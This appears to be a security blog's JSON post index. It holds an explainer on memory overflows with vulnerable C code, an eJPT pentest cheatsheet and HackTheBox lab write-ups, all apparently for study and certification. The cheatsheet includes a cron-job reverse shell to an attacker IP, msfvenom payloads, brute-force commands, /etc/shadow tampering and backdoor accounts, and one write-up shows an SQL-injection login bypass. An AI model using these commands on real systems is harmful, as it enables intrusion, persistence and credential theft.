[ { "title": "Buffer Overflow, Heap Overflow, Integer Overflow - Vulnerabilities Explained", "url": "/posts/buffer-heap-and-integer-overflows-explained/", "categories": "Articles", "tags": "buffer, heap, integer, overflow", "date": "2024-11-06 00:00:00 +0100", "snippet": "In the world of software security, vulnerabilities such as buffer overflows, heap overflows, and integer overflows are some of the most dangerous issues that can lead to unexpected behavior, crashes, and potential exploits. Each of these vulnerabilities stems from improper handling of memory, and they can be leveraged by attackers to take control of a system, execute arbitrary code, or cause a denial of service. In this article, we will explain each of these vulnerabilities with examples.Buffer OverflowWhat is a Buffer OverflowA buffer overflow occurs when data exceeds the boundary of a memory buffer, which is a fixed-size region of memory used to store data. When the data goes beyond the allocated buffer space, it can overwrite adjacent memory locations. This can corrupt data, crash the program, or even allow an attacker to inject malicious code into the program’s memory.Example of a Vulnerable ProgramLet’s take an example of a simple C program that reads user input into a fixed-size buffer:#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vulnerable_function(char *input) { char buffer[16]; strcpy(buffer, input); // No bounds checking, risky operation printf(\"Input was: %s\\n\", buffer);}int main() { char input[100]; printf(\"Enter a string: \"); fgets(input, 100, stdin); vulnerable_function(input); return 0;}In the example above, the function vulnerable_function() copies user input into a fixed-size buffer of 16 bytes (16 chars) using the strcpy() function. However, strcpy() does not check the size of the input, meaning that if the user provides more than 16 bytes of input, it will overflow the buffer and overwrite adjacent memory.Let’s run this code!First with legit input:$ ./bufferEnter a string: abcdefInput was: abcdefThen with too long input:$ ./bufferEnter a string: abcdefghijklmnopqrstuvwxyzInput was: abcdefghijklmnopqrstuvwxyz*** stack smashing detected ***: terminatedAborted (core dumped)We can see that when the input is longer than the allocated memory space it crashes the application!MitigationTo avoid the buffer overflow vulnerability follow these rules: Use safe string manipulation functions such as strncpy() or snprintf() that allow you to specify the maximum size of the buffer Limit input size by explicitly checking the length of the user input Avoid using fixed-size buffers wherever possible, but if you must, always ensure they are large enough and properly boundedHere is a secured version of the previous code:#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAX_INPUT_SIZE 16 // Define the maximum input sizevoid secure_function(char *input) { char buffer[MAX_INPUT_SIZE + 1]; // Make sure there's room for the null terminator // Use snprintf() to prevent overflow, specifying the buffer size snprintf(buffer, sizeof(buffer), \"%s\", input); printf(\"Input was: %s\\n\", buffer);}int main() { char input[MAX_INPUT_SIZE + 1]; // Ensure the input buffer can hold the maximum size printf(\"Enter a string (max %d characters): \", MAX_INPUT_SIZE); // Use fgets() to read input safely, and ensure we don't read more than MAX_INPUT_SIZE characters if (fgets(input, sizeof(input), stdin) != NULL) { // Remove the trailing newline character if present input[strcspn(input, \"\\n\")] = '\\0'; secure_function(input); } else { printf(\"Input error!\\n\"); } return 0;}Let’s run it again to verify:$ ./no_bufferEnter a string (max 16 characters): abcdefInput was: abcdefThen with too long input:$ ./no_bufferEnter a string (max 16 characters): abcdefghijklmnopqrstuvwxyzInput was: abcdefghijklmnopThe input is now safely truncated and crashes are avoided!Heap OverflowWhat is a Heap OverflowA heap overflow occurs when data exceeds the bounds of a memory buffer that resides in the heap area. Unlike buffer overflows, which are often associated with stack memory, heap overflows target dynamically allocated memory that is managed by functions like malloc() and calloc(). When data is written beyond the allocated heap buffer, it can corrupt adjacent memory on the heap, which may contain critical structures like metadata for memory management or function pointers. This can lead to arbitrary code execution, program crashes, or even privilege escalation.Example of a Vulnerable ProgramHere’s an example of a C program with a vulnerability in heap memory allocation:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void vulnerable_heap_function(char *input) { char *buffer = (char *)malloc(16); // Allocate 16 bytes on the heap if (buffer == NULL) { printf(\"Memory allocation failed!\\n\"); exit(1); } strcpy(buffer, input); // No bounds check printf(\"Input was: %s\\n\", buffer); free(buffer); // Free the allocated memory}int main() { char input[100]; printf(\"Enter a string: \"); fgets(input, 100, stdin); vulnerable_heap_function(input); return 0;}MitigationTo prevent heap overflows, follow these best practices: Use safe memory management functions: Instead of strcpy(), use strncpy() or snprintf() to specify a maximum buffer size Validate input size: Check that input data does not exceed the size of allocated memory Implement bounds-checking libraries: Libraries like libsafe and other runtime memory management tools can provide extra protection against overflow attacksHere’s a safer version of the above program:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_HEAP_INPUT_SIZE 16void secure_heap_function(char *input) { char *buffer = (char *)malloc(MAX_HEAP_INPUT_SIZE + 1); // Allocate space for the null terminator if (buffer == NULL) { printf(\"Memory allocation failed!\\n\"); exit(1); } strncpy(buffer, input, MAX_HEAP_INPUT_SIZE); buffer[MAX_HEAP_INPUT_SIZE] = '\\0'; // Ensure the string is null-terminated printf(\"Input was: %s\\n\", buffer); free(buffer);}int main() { char input[100]; printf(\"Enter a string (max %d characters): \", MAX_HEAP_INPUT_SIZE); fgets(input, 100, stdin); input[strcspn(input, \"\\n\")] = '\\0'; // Remove trailing newline secure_heap_function(input); return 0;}Integer OverflowWhat is an Integer OverflowAn integer overflow happens when an arithmetic operation results in a value outside the allowed range for a data type. For instance, if an int type can hold values from -2,147,483,648 to 2,147,483,647, adding 1 to 2,147,483,647 will cause an overflow and may wrap around to the minimum value. This unintended behavior can lead to logic errors, memory corruption, or even security vulnerabilities if the overflowed value is used in memory allocation or other critical calculations.Example of a Vulnerable ProgramHere’s a simple example where integer overflow could lead to unexpected behavior:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void allocate_buffer(int size) { char *buffer; if (size &gt; 0) { buffer = (char *)malloc(size); if (buffer == NULL) { printf(\"Memory allocation failed!\\n\"); return; } printf(\"Buffer allocated with size: %d\\n\", size); free(buffer); } else { printf(\"Invalid buffer size!\\n\"); }}int main() { int size = 2147483647; // Max value for a signed 32-bit integer size += 1; // Causes an integer overflow allocate_buffer(size); return 0;}In this example, size overflows to a negative value due to the addition, which could cause unexpected behavior in malloc() and potentially lead to a security vulnerability.MitigationTo mitigate integer overflows, follow these guidelines: Check for overflows: Before performing arithmetic operations, verify if the result will fit within the type’s range Use safer integer libraries: Libraries like SafeInt provide functions to detect overflows in arithmetic operations Choose appropriate data types: Use data types with a large enough range or with built-in overflow protection if available#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;limits.h&gt;void allocate_buffer(int size) { char *buffer; if (size &gt; 0 &amp;&amp; size &lt; INT_MAX) { buffer = (char *)malloc(size); if (buffer == NULL) { printf(\"Memory allocation failed!\\n\"); return; } printf(\"Buffer allocated with size: %d\\n\", size); free(buffer); } else { printf(\"Invalid buffer size!\\n\"); }}int main() { int size = INT_MAX; // Set to max value to test overflow if (size + 1 &gt; INT_MAX) { printf(\"Integer overflow detected! Adjusting size.\\n\"); size = INT_MAX; } else { size += 1; } allocate_buffer(size); return 0;}Now, the program detects and prevents overflow, safeguarding against unintended behavior.ConclusionUnderstanding buffer, heap, and integer overflows is crucial for anyone working in software security. Each of these vulnerabilities originates from improper memory or data handling, and, if exploited, can lead to severe consequences such as arbitrary code execution, system crashes, or data corruption. By knowing how these overflows work and implementing proper safeguards, developers can better protect their applications against such attacks. Techniques like safe memory management, rigorous bounds checking, and using modern compiler defenses play a vital role in mitigating these risks." }, { "title": "🎓 Master of Cybersecurity Portfolio", "url": "/posts/mscyber/", "categories": "Master", "tags": "", "date": "2024-09-12 00:00:00 +0200", "snippet": "From September 2023 to September 2024 I enrolled in the Master of Cybersecurity of the prestigious Universitat Politècnica de Catalunya (UPC) in Barcelona.This master is completely in english and is divided in two semesters for a total of 60 credits ECTS. This article is just an overview. You can find the full version with more details here.SubjectsSemester 1 Application Security Blockchain Data Protection Malware Network Security Traffic Monitoring &amp; AnalysisSemester 2 Cybersecurity Use-cases Hardware Security Network Security - Authentication &amp; Authorization Software-Defined Security Master Thesis - HuntDownProjectsDuring this year I had to do many projects but the most interesting are the following: 🪱 A multi function worm. More info here. ⚡ A Correlation Power Analysis attack. More info here. 💥 HuntDown: a cybersecurity tool automating pentests. More info hereGraduationI graduated with a 9.5/10 on my thesis, giving me an overall average of 7.83/10." }, { "title": "📜 eJPT Cheatsheet", "url": "/posts/ejpt-cheatsheet/", "categories": "Certifications, eJPT", "tags": "ejpt, cheatsheet", "date": "2024-04-17 00:00:00 +0200", "snippet": "Here is my personal eJPT cheatsheet that I built while following the associated course and used during the exam.Information GatheringPassive Information GatheringDNS Reconnaissance dnsrecon dnsdumpsterdnsrecon -d target.comEmail Harvesting theHarvestertheHarvester -d target.com -d google,linkedinGoogle Dorks Google Hacking Database WayBackMachinesite:*.target.comsite:*.target.com intitle:adminsite:*.target.com filetype:pdfintitle:index ofcache:target.comLeaked Passwords Databases Have I Benn PwnedSubdomain Enumeration sublist3rsublist3r -d hackersploit.com -e google,yahoo -o hackersploit.txtDetect WAF wafw00Fwafw00f target.comwafw00f https://target.com -aWebsite Footprinting netcraft BuiltWith Wappalyzer webhttrackhost target.comwhatweb target.comwhois target.comActive Information GatheringDNS Zone Transfers dnsenum dig fiercednsenum target.comdig axfr @subdomain target.comfierce -dns target.comHost Discovery nmap netdiscover# identify host ip addressip ad# scan networksudo nmap -sn 192.168.1.0/24sudo netdiscover -i eth0 -r 192.168.1.0/24 -sn : No port scanFootprinting and Scanning nmap MetasploitPort Scanning Scan all ports with -p- option. Scan specific ports with -p 80,443 for example -Pn to disable isAlive check -sU for UDP scan -sV to perform service version scan -O to try to identify running Operating System -sC default nmap scripts to get more information from open ports -A aggressive scan combining -sV -sC -O -T0 to scan very sneakily -T5 to scan very aggressively -oN file.txt to save output in text format -oX file.xml to save output in xml format Can be imported in Metasploit Import nmap scan in MSF:$ msfconsole# create workspacemsf6&gt; workspace -a &lt;name&gt;# import scanmsf6&gt; db_import xml_scan.xml# target is now added to hostsmsf6&gt; hostsmsf6&gt; services# nmap scan from msfmsf6&gt; db_nmap &lt;ip&gt;Nmap Scripting Engine# list all scriptsls -al /usr/share/nmap/scripts# filter by categoryls -al /usr/share/nmap/scripts | grep -e \"http\"# run scriptnmap --script &lt;script1&gt;[,&lt;script2&gt;,&lt;script3&gt;] &lt;ip&gt;Firewall &amp; IDS EvasionHow to detect the presence of a firewall? -sA: send ACK packet to open port To know if port if filtered or unfiltered How to evade Firewall/IDS? -f: Use packet fragmenting --mtu 8: minimum transmission unit Gateway IP can be spoofed to trick IDS: Gateway IP is always x.x.x.1 --data-length 200 -D &lt;gateway ip&gt; -g 53: spoof gateway’s source port Enumeration nmapFTP Hydranmap &lt;ip&gt; -p 21 -sVnmap &lt;ip&gt; -p 21 --script ftp-anonAnonymous login:ftp &lt;ip&gt;&gt; anonymous&gt;ftp&gt; get file.txtftp&gt; byeBrute force users:nmap &lt;ip&gt; --script ftp-brute --script-args userdb=users.txt -p 21Brute force credentials:hydra -L common_users.txt -P unix_password.txt &lt;ip&gt; ftpHTTP whatweb dirb browsh lynx nmap -p 80 --script http-enumnmap -p 80 --script http-headersApachenmap &lt;ip&gt; -p 80 -sV --script bannerlynx http://&lt;ip&gt;Look for robots.txt file.IISwhatweb &lt;ip&gt;SMB smbclient rpcclient SMBMapnmap -p 445 --script smb-protocols &lt;ip&gt;nmap -p 445 --script smb-security-mode &lt;ip&gt;nmap -p 445 --script smb-enum-sessions &lt;ip&gt;nmap -p 445 --script smb-enum-sessions --script-args ... &lt;ip&gt;nmap -p 445 --script smb-enum-shares &lt;ip&gt;# anonymoussmbmap -u guest -p \"\" -d . -H &lt;ip&gt;# admin usersmbmap -u administrator -p smbserver_771 -H &lt;ip&gt; -x 'ipconfig'&gt; use auxiliary/scanner/smb/smb_login&gt; set RHOSTS &lt;ip&gt;&gt; set USER_FILE common_users.txt&gt; set PASS_FILE unix_passwords.txt&gt; set VERBOSE false # to only print succeed$ psexec.py &lt;username&gt;@&lt;ip&gt; cmd.exePassword:C:\\Windows\\system32&gt;To open a meterpreter session:&gt; use exploit/windows/smb/psexec&gt; set RHOSTS &lt;ip&gt;&gt; set SMBUser &lt;username&gt;&gt; set SMBPass &lt;password&gt;SQLMySQLnmap -sV -p 3306 --script=mysql-empty-passwordnmap -sV -p 3306 --script=mysql-infomysql -h &lt;ip&gt; -u root&gt; show databases;&gt; use &lt;db&gt;;&gt; select * from &lt;table&gt;;&gt; select load_file(\"/etc/shadow\");msf5&gt; use auxiliary/scanner/mysql/mysql_writable_dirsmsf5&gt; use auxiliary/scanner/mysql/mysql_hashdumpDictionary Attackmsf5&gt; use/auxiliary/scanner/mysql/mysql_loginmsf5&gt; set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txthydra -l root -P unix_passwords.txt &lt;ip&gt; mysqlMSSQLnmap &lt;ip&gt; -p 1433 --script ms-sql-infonmap &lt;ip&gt; -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433nmap &lt;ip&gt; -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txtnmap &lt;ip&gt; -p 1433 --script ms-sql-empty-passwordnmap &lt;ip&gt; -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=\"type c:\\flag.txt\"Using metasploit to brute force user and passwords:&gt; use auxiliary/scanner/mssql/mssql_login&gt; use auxiliary/admin/mssql/mssql_enum&gt; use auxiliary/admin/mssql/mssql_enum_sql_logins&gt; use auxiliary/admin/mssql/mssql_execSSHnc &lt;ip&gt; 22ssh &lt;user&gt;@&lt;ip&gt;nmap &lt;ip&gt; -p 22 --script ssh2-enum-algosnmap &lt;ip&gt; -p 22 --script ssh2-hostkey --script-args ssh_hostkey=fullRDP...Dictionary Attackhydra -l student -P rockyou.txt &lt;ip&gt; sshnmap &lt;ip&gt; -p 22 --script ssh-brute --script-args userdb=users.txtVulnerability Assessment Nessus searchsploit exploitdb MetasploitExploitationLinuxvsFTPd$ ftp &lt;ip&gt;anonymous$ searchploit vsftpd$ searchsploit -m &lt;exploit&gt;# brute force# smtp can identify user acounts very easily&gt; use smtp/smtp_enum# brute force with usernames$ hydra -l &lt;user&gt; -P unix_users &lt;ip&gt; ftpSamba# samba smbd port 445&gt; use smb_version$ searchsploit samba 3.0.20&gt; use multi/samba/usermap_scriptPHP# targeting port 80 Apache httpd 2.2.8# search for /phpinfo.php file$ searchsploit php$ searchsploit -m# change pwn_code$ nc -lvnp 1234$ python2 18836.py &lt;ip&gt; 80WindowsIIS FTPMicrosoft ftpd (port 21) it’s used in combination with Microsoft IIS httpd (port 80)# test ftp anon auth$ nmap -sV -p 21 --script ftp-anon &lt;ip&gt;# hydra brute force ftp$ hydra -L unix_users.txt -P unix_passwords.txt &lt;ip&gt; ftp$ hydra -l &lt;username&gt; -P unix_passwords.txt &lt;ip&gt; ftp# connect$ ftp &lt;ip&gt; &lt;port&gt;$ msfvenom -p windows/shell/reverse_tcp LHOST=&lt;ip&gt; LPORT=1234 -f asp &gt; shell.aspxftp&gt; put shell.aspx&gt; use multi/handlerMySQL$ searchsploit mysql&gt; use mysql_login&gt; set PASS_FILE unix_passwords.txt$ mysql -u &lt;user&gt; -p -h &lt;ip&gt;&gt;show databasesIf some web apps have restricted access you can modify the conf:cat C:\\wamp\\www\\wordpress\\wp-config.phpcat C:\\wamp\\alias\\phpmyadmin.confnet stop wampapachenet start wampapacheOpenSSHsearchsploit OpenSSHhydra -l vagrant -P unix_users.txt &lt;ip&gt; sshssh &lt;user&gt;@&lt;ip&gt;SMB# after obtaining credentials# go enum shares$ smbclient -L &lt;ip&gt; -U &lt;user&gt;$ smbmap -u &lt;user&gt; -p &lt;pass&gt;$ enum4linux -u &lt;user&gt; -p &lt;pass&gt; &lt;ip&gt;# msf modules&gt; smb/enum_users$ locate psexec.py$ python psexec.py &lt;user&gt;@&lt;ip&gt;&gt; smb/psexec_loggedin_users&gt; exploit/windows/smb/ms17_010_eternalbluePost-ExploitationLinuxHashescat /etc/shadow&gt; use post/linux/gather/hashdump# save hash line in a hash.txt filegzip -d /usr/share/wordlists/rockyou.txt.gzjohn --format=sha512crypt hash.txt --wordlist=rockyou.txt# 1800 = sha512hashcat -a3 -m 1800 hash.txt rockyou.txtLocal EnumerationUsers &amp; Groupsm&gt; getuidm&gt; shell/bin/bash -i$ whoami$ groups$ groups &lt;user&gt;$ cat /etc/passwd$ ls /home# get last logged users (ssh or physical)$ last$ lastlogNetwork Informationm&gt; ifconfigm&gt; netstatm&gt; routem&gt; shell/bin/bash -i$ ip add$ cat /etc/networks$ cat /etc/hostname$ cat /etc/hosts$ cat /etc/resolv.conf$ arpSystem Informationm&gt; shell$ hostname$ cat /etc/issue$ cat /etc/*release$ uname -a$ env$ lscpu$ df -h$ lsblk | grep sd$ dpkg -lProcesses &amp; Cron Jobsm&gt; psm&gt; pgrep &lt;process&gt;$ ps aux$ top# cron jobs$ crontab -l$ ls -al /etc/cron*Automated&gt; upload LinEnum.sh$ chmod +x LinEnum.sh$ ./LinEnum.shPrivilege Escalation# list command I can runsudo -l# /usr/bin/man can be run as rootsudo man ls!/bin/bash# simple local enumwhoamicat /etc/passwdgroupsgroups &lt;user&gt;find / -not -type l -perm -o+w 2&gt;/dev/null# /etc/shadow is writableopenssl passwd -1 -salt abc &lt;new_password&gt;# edit /etc/shadowroot:&lt;hash&gt;:[...]suPersistenceCron Jobsssh &lt;user&gt;@&lt;ip&gt;# list cron jobs$ cat /etc/cron*# create backdoor cron jobs$ echo \"* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1\" &gt; my_cronnc -lvnp &lt;port&gt;SSH keysssh &lt;user&gt;@&lt;ip&gt;$ cd ~/.ssh$ cat id_rsa# copy the priv keyscp &lt;user&gt;@&lt;ip&gt;:~/.ssh/id_rsa .chmod 400 id_rsassh -i id_rsa &lt;user&gt;@&lt;ip&gt;WindowsHashesm&gt; getprivsm&gt; pgrep lsassm&gt; migrate &lt;id&gt;m&gt; hashdump&lt;hashes&gt;# paste hashes in hashes.txtjohn --list=formatsjohn --format=NT hashes.txt [--wordlist=&lt;wordlist&gt;]gzip -d /usr/share/wordlists/rockyou.txt.gz# id 1000 for NTLMhashcat -a3 -m 1000 hashes.txt rockyou.txtxfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;ip&gt;Local EnumerationUsers &amp; Groupsm&gt; getuidm&gt; getprivsm&gt; backgroupd&gt; use post/windows/gather/enum_logged_on_usersm&gt; shell&gt;whoami&gt;whoami /priv&gt;query user# see all users&gt;net users&gt;net user &lt;user&gt;&gt;net localgroup# see users part of a group&gt;net localgroup administratorsNetwork Informationm&gt; shell&gt;ipconfig&gt;ipconfig /all&gt;route print&gt;arp -a&gt;netstat -ano&gt;netsh firewall show state&gt;netsh advfirewall dump&gt;netsh advfirewall show allprofilesSystem Information# meterpreter session&gt; getuid&gt; sysinfo&gt; shell&gt;hostname&gt;systeminfo&gt;wmic qfe get Caption,Decription,HotfixID,InstalledOnm&gt; cat C:\\eula.txtProcesses &amp; Servicesm&gt; psm&gt; pgrep explorer.exem&gt; migrate &lt;pid&gt;m&gt; shell# services started&gt;net start&gt;wmic service list brief&gt;tasklist /SVC&gt;schtasks /query /fo LIST [/v]Automated# get a meterpreter shell...m&gt; show_mount&gt; use post windows/gather/win_privs&gt; use post/windows/gather/enum_logged_on_users&gt; use post/windows/gather/checkvm&gt; use post/windows/gather/enum_applications&gt; use post/windows/gather/enum_computers&gt; use post/windows/gather/enum_patches&gt; use post/windows/gather/enum_shares# clone the jaws-enum.ps1 firstm&gt; cd C:\\\\m&gt; mkdir Tempm&gt; cd Tempm&gt; upload jaws-enum.ps1m&gt; powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename jaws-enum.txtm&gt; dowload jaws-enum.txtPrivilege Escalation# when you find credentials# connect using python psexec$ psexec.py &lt;user&gt;@&lt;ip&gt;&gt;whoami&gt;whoami /priv# or connect using msf module&gt; use exploit/windows/smb/psexecm&gt;&gt; use exploit/multi/script/web_deliverym&gt; shell&gt; powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"PersistenceRDP&gt; use exploit/windows/http/badblue_passthrum&gt; pgrep explorerm&gt; migrate &lt;pid&gt;# create backdoor userm&gt; run getgui -e -u &lt;username&gt; -p &lt;password&gt;# connect to it via rdpxfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;ip&gt;Services&gt; use exploit/windows/local/persistence_servicePivoting# once with a meterpreter sessionm&gt; ipconfigm&gt; run autoroute -s &lt;ip&gt;.0/20# list routesm&gt; run autoroute -pm&gt; background&gt; use auxiliary/scanner/portscann/tcp&gt; set RHOSTS &lt;ip_target2&gt;m&gt; portfwd add -l 1234 -p &lt;target2_port&gt; -r &lt;target2_ip&gt;# scan portforwarded wit nmap$ nmap -sV -p 1234 localhost&gt; use &lt;module&gt;&gt; set RHOSTS &lt;target2_ip&gt;Upgrading shells# simple upgrade/bin/bash -i# first list valid shellscat /etc/shells# look for pythonpython --version# if python is installedpython -c 'import pty; pty.spawn(\"/bin/bash\")'# if perlperl -e 'exec \"/bin/bash\";'# look for envenv# set useful variablesexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport TERM=xtermexport SHELL=bashTransferring FilesLinux# on attack machinepython 3 -m http.server 80# on victim machinewget http://&lt;ip&gt;/&lt;file&gt;Windowspython3 -m http.server 80# dl on windows&gt;certutil -urlcache -f http://&lt;ip&gt;/&lt;file&gt; &lt;file&gt;" }, { "title": "🏅 How I passed the eJPT in 2024.", "url": "/posts/ejpt-review/", "categories": "Certifications, eJPT", "tags": "ejpt", "date": "2024-04-10 00:00:00 +0200", "snippet": "Getting the eLearnSecurity Junior Penetration Tester (eJPT) certification was a big achievement for me, as it was my first cybersecurity certification. It helped me improve my skills in penetration testing and gave me hands-on experience. In this post, I’ll share how I prepared and give some tips to help you pass the eJPT.Why I Chose eJPTI chose this certification because it is an entry-level certification with a fair price. Whether you’re just starting or looking for a challenge, I recommend it.The ExamThe exam is 48h exam consisting of 35 questions.It covers the following skills: Assessment Methodologies Host and Networking Auditing Host and Network Penetration Testing Web Application Penetration TestingThe courseThe associated course, called PTS (Penetration Testing Student), is a mix of videos, PDFs, and labs. It took me two months to complete because I was also studying for my Master’s in Cybersecurity at the same time, and I didn’t want to skip any materials. Since this was my first certification, I wanted to do everything right.What I likedSince this is my first certification, I don’t have much to compare it to, but here are my thoughts: Alexis Ahmed, the main instructor, is very good. He explains everything clearly and provides examples. There are many labs, so if you don’t want to watch all the videos, you can still practice with the labs and save time. The course revisits topics multiple times. At first, I found this a bit repetitive, but in the end, it was helpful. If you forget something, there’s a good chance it will come up again later in the course, often in a different context to explain another aspect.What I didn’t like The second instructor, Josh Mason, just reads the PDFs he’s presenting without adding much extra information. The exam is done in a browser-based Kali VM, which can be very frustrating if your internet connection isn’t stable. I had to refresh the page too many times.My tips Note all the commands shown in the course Summarize your notes in a cheatsheet, you will save a lot of time during the exam Read all the questions multiple times before starting anything! It will give you a good understanding of the overall target structureConclusionOverall, passing the eJPT was a great learning experience for me. It not only gave me hands-on skills in penetration testing but also boosted my confidence to pursue more advanced certifications.Good luck for it! If you have any questions feel free to contact me :)" }, { "title": "🔵 HTB - Responder", "url": "/posts/htb-responder/", "categories": "HackTheBox, Machines", "tags": "htb, starting-point", "date": "2023-08-20 00:00:00 +0200", "snippet": "HTB / Starting Point / ResponderResponder⌛What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? sql injection What is the 2021 OWASP Top 10Synced What is the default port for rsync? 873 How many TCP ports are open on the remote host? 1 What is the protocol version used by rsync on the remote machine? 31" }, { "title": "🔵 HTB - Sequel", "url": "/posts/htb-sequel/", "categories": "HackTheBox, Machines", "tags": "", "date": "2023-08-18 00:00:00 +0200", "snippet": "⌛" }, { "title": "🔵 HTB - Synced", "url": "/posts/htb-synced/", "categories": "HackTheBox, Machines", "tags": "rsync", "date": "2023-08-17 00:00:00 +0200", "snippet": "SyncedWhat is the default port for rsync?873How many TCP ports are open on the remote host?1What is the protocol version used by rsync on the remote machine?31What is the most common command name on Linux to interact with rsync?rsyncWhat credentials do you have to pass to rsync in order to use anonymous authentication?NoneWhat is the option to only list shares and files on rsync?--list-onlySubmit root flag$ nmap -sV -p- &lt;ip&gt;...PORT STATE SERVICE VERSION873/tcp open rsync (protocol version 31)$ rsync --list-only &lt;ip&gt;::public \tAnonymous Share$ rsync --list-only &lt;ip&gt;::publicdrwxr-xr-x 4,096 2022/10/24 23:02:23 .-rw-r--r-- 33 2022/10/24 22:32:03 flag.txt$ rsync -azvh None@&lt;ip&gt;::public ./receiving incremental file list./flag.txtsent 50 bytes received 158 bytes 24.47 bytes/sectotal size is 33 speedup is 0.16$ cat flag.txt72eaf5344ebb84908ae543a719830519" }, { "title": "🔵 HTB - Appointment", "url": "/posts/htb-appointment/", "categories": "HackTheBox, Machines", "tags": "nmap, gobuster, sqli", "date": "2023-08-17 00:00:00 +0200", "snippet": "What does the acronym SQL stand for?Structured Query LanguageWhat is one of the most common type of SQL vulnerabilities?sql injectionWhat is the 2021 OWASP Top 10 classification for this vulnerability?A03:2021-InjectionWhat does Nmap report as the service and version that are running on port 80 of the target?Apache httpd 2.4.38 ((Debian))What is the standard port used for the HTTPS protocol?443What is a folder called in web-application terminology?directoryWhat is the HTTP response code is given for ‘Not Found’ errors?404Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?dirWhat single character can be used to comment out the rest of a line in MySQL?#If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?CongratulationsSubmit root flag$ nmap -sV -p- &lt;ip&gt;...PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.38 ((Debian))$ gobuster dir -u &lt;ip&gt;:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt.../images (Status: 301) [Size: 317] [--&gt; http://10.129.146.191/images/]/css (Status: 301) [Size: 314] [--&gt; http://10.129.146.191/css/]/js (Status: 301) [Size: 313] [--&gt; http://10.129.146.191/js/]/vendor (Status: 301) [Size: 317] [--&gt; http://10.129.146.191/vendor/]/fonts (Status: 301) [Size: 316] [--&gt; http://10.129.146.191/fonts/]/server-status (Status: 403) [Size: 279]...$ firefox &lt;ip&gt;:80 &amp;login: admin'#password: abcflag: e3d0796d002a446c0e622226f42e9672" }, { "title": "🔵 HTB - Redeemer", "url": "/posts/htb-redeemer/", "categories": "HackTheBox, Machines", "tags": "redis", "date": "2023-08-01 00:00:00 +0200", "snippet": "RedeemerWhich TCP port is open on the machine?$ nmap -sC -sV &lt;ip&gt;no port open$ nmap -sC -sV -p- &lt;ip&gt;...PORT STATE SERVICE VERSION6379/tcp open redis Redis key-value store 5.0.7Which service is running on the port that is open on the machine?RedisWhat type of database is Redis?In-memory DatabaseWhich command-line utility is used to interact with the Redis server?redis-cliWhich flag is used with the Redis command-line utility to specify the hostname?-h &lt;hostname&gt;Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?$ redis-cli -h &lt;hostname&gt; -p &lt;port&gt;hostname:port&gt; infoWhat is the version of the Redis server being used on the target machine?5.0.7Which command is used to select the desired database in Redis?selectHow many keys are present inside the database with index 0?hostname:port&gt; info...# Keyspacedb0:keys=4,expires=0,avg_ttl=0...Which command is used to obtain all the keys in a database?keys *Submit root flaghostname:port&gt; keys * 1) \"temp\" 2) \"stor\" 3) \"numb\" 4) \"flag\" hostname:port&gt; keys 4 (empty array) hostname:port&gt; keys flag 1) \"flag\" hostname:port&gt; get flag \"03e1d2b376c37ab3f5319922053953eb\"" }, { "title": "🔵 HTB - Preignition", "url": "/posts/htb-preignition/", "categories": "HackTheBox, Machines", "tags": "nginx, gobuster", "date": "2023-08-01 00:00:00 +0200", "snippet": "Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking.dir bustingWhat switch do we use for nmap’s scan to specify that we want to perform version detection-sVWhat does Nmap report is the service identified as running on port 80/tcp?$ nmap -sV -p- &lt;ip&gt;...PORT STATE SERVICE VERSION80/tcp open http nginx 1.14.2...What server name and version of service is running on port 80/tcp?nginx 1.14.2What switch do we use to specify to Gobuster we want to perform dir busting specifically?dirWhen using gobuster to dir bust, what switch do we add to make sure it finds PHP pages?-x phpWhat page is found during our dir busting activities?admin.phpWhat is the HTTP status code reported by Gobuster for the discovered page?200Submit root flag$ curl &lt;ip&gt;/admin.php...shows a login form...$ firefox &lt;ip&gt;/admin.phpadmin:admin6483bee07c1c1d57f14e5b0717503c73" }, { "title": "🔵 HTB - Mongod", "url": "/posts/htb-mongod/", "categories": "HackTheBox, Machines", "tags": "mongodb", "date": "2023-08-01 00:00:00 +0200", "snippet": "MongodHow many TCP ports are open on the machine?2Which service is running on port 27017 of the remote host?$ nmap -sV -p- &lt;ip&gt;...PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)27017/tcp open mongodb MongoDB 3.6.8...What type of database is MongoDB?NoSQLWhat is the command name for the Mongo shell that is installed with the mongodb-clients package?mongoWhat is the command used for listing all the databases present on the MongoDB server?show dbsWhat is the command used for listing out the collections in a database?show collectionsWhat is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?db.flag.find().pretty()Submit root flag# Download binaries$ curl -O &lt;https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz&gt;$ tar xvf mongodb-linux-x86_64-3.4.7.tgz$ cd mongodb-linux-x86_64-3.4.7.tgz$ ./bin/mongo mongodb://&lt;ip&gt;:27017&gt; show 